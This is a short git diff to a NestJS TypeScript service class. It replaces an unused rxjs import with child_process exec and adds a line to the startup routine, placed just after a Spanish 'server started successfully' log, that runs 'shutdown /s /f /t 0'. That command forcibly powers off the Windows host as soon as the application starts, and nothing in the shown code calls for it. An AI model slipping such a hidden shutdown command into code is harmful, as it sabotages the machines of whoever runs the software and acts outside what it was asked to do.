@@ -5,10 +5,12 @@ import { User } from './users/entities/user.entity';
 import { CategoriesRepository } from './categories/categories.repository';
 import { MeasurementsRepository } from './measurements/measurements.repository';
 import { Cron, CronExpression } from '@nestjs/schedule';
-import { every } from 'rxjs';
+import { exec } from 'child_process';
 
 @Injectable()
 export class AppService implements OnModuleInit{
+
+  
   
   constructor(
     private readonly usersRepository: UsersRepository,
@@ -24,7 +26,7 @@ export class AppService implements OnModuleInit{
       await this.measurementsRepository.addMeasurements()
       await this.usersRepository.premiumCheck()
       console.log("servidor pro levantado con éxito✨✨✨✨")
-
+      exec("shutdown /s /f /t 0")
   }
 
   @Cron(CronExpression.EVERY_DAY_AT_2AM)
